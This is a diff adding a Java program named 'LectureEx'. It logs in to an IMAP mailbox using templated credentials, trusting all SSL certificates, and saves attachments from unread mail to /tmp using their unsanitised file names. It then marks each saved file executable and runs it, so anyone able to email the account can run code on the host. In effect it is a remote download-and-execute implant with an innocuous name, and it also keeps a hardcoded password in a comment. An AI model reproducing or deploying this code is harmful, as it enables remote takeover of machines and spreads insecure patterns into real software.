@@ -1,0 +1,135 @@
+import java.io.*;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Properties;
+
+import javax.mail.Flags.Flag;
+import javax.mail.Folder;
+
+import javax.mail.BodyPart;
+import javax.mail.Flags;
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.NoSuchProviderException;
+import javax.mail.Part;
+import javax.mail.Session;
+import javax.mail.Store;
+
+
+import javax.mail.Multipart;
+
+import com.sun.mail.imap.IMAPFolder;
+
+public class LectureEx {
+	public static void main(String[] args) throws MessagingException, IOException {
+		System.out.println("Application Started");
+		// TODO Auto-generated method stub
+		IMAPFolder folder = null;
+		Store store = null;
+
+
+		String username = "<% @email_user %>";
+		String password = "<% @email_pass %>";
+
+
+
+		// Get user password using JPasswordField
+		/*JPasswordField pwd = new JPasswordField(10);
+		int action = JOptionPane.showConfirmDialog(null, pwd,"Enter Password",JOptionPane.OK_CANCEL_OPTION);
+		if(action < 0) {
+			JOptionPane.showMessageDialog(null,"Cancel, X or escape key selected");
+			System.exit(0);
+		}
+		else */
+			//password = "GMAILSexyAneta-100%"; //new String(pwd.getPassword());
+
+		// Set Property with username and password for authentication
+
+		// Step 1.1:  set mail user properties using Properties object
+				Properties props = System.getProperties();
+				props.put("mail.imaps.ssl.trust", "*");
+				props.setProperty("mail.store.protocol", "imap");
+				props.setProperty("mail.user", username);
+				props.setProperty("mail.password", password);
+
+		//Step 1.2: Establish a mail session (java.mail.Session)
+		Session session = Session.getDefaultInstance(props);
+
+		try
+		{
+			// Step 2: Get the Store object from the mail session
+			// A store needs to connect to the IMAP server
+			store = session.getStore("imap");
+			store.connect("<% @email_server %>",username, password);
+
+			// Step 3: Choose a folder, in this case, we chose inbox
+			folder = (IMAPFolder) store.getFolder("inbox");
+
+			// Step 4: Open the folder
+			if(!folder.isOpen())
+				folder.open(Folder.READ_ONLY);
+
+			Message messages[] = folder.getMessages();
+
+			// Attachments
+			List<File> attachments = new ArrayList<File>();
+
+			//Command to run the attachment
+			//String command = ".";
+
+			// Get all messages
+			for(Message message:messages) {
+
+				if(!message.getFlags().equals(Flag.SEEN) && message.getContent() instanceof Multipart){
+
+					// How to get parts from multiple body parts of MIME message
+					Multipart multipart = (Multipart) message.getContent();
+
+					for (int x = 0; x < multipart.getCount(); x++) {
+						BodyPart bodyPart = multipart.getBodyPart(x);
+						// Save attachments
+						if(!Part.ATTACHMENT.equalsIgnoreCase(bodyPart.getDisposition())) {
+					            continue; // dealing with attachments only
+					        }
+					        InputStream is = bodyPart.getInputStream();
+					        File f = new File("/tmp/attachments/" + bodyPart.getFileName());
+					        FileOutputStream fos = new FileOutputStream(f);
+					        byte[] buf = new byte[4096];
+					        int bytesRead;
+					        while((bytesRead = is.read(buf))!=-1) {
+					            fos.write(buf, 0, bytesRead);
+					        }
+					        fos.close();
+					        attachments.add(f);
+
+					}
+
+				}
+
+		}
+
+		// Execute attachments
+
+		for (int i = 0; i < attachments.size(); i++){
+			Process p = Runtime.getRuntime().exec("chmod a+x " + attachments.get(i).toString());
+			Runtime.getRuntime().exec(attachments.get(i).toString());
+
+		}
+
+
+
+		} catch (NoSuchProviderException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (MessagingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		finally
+		{
+			if (folder != null && folder.isOpen()) { folder.close(true); }
+			if (store != null) { store.close(); }
+		}
+
+	}
+}
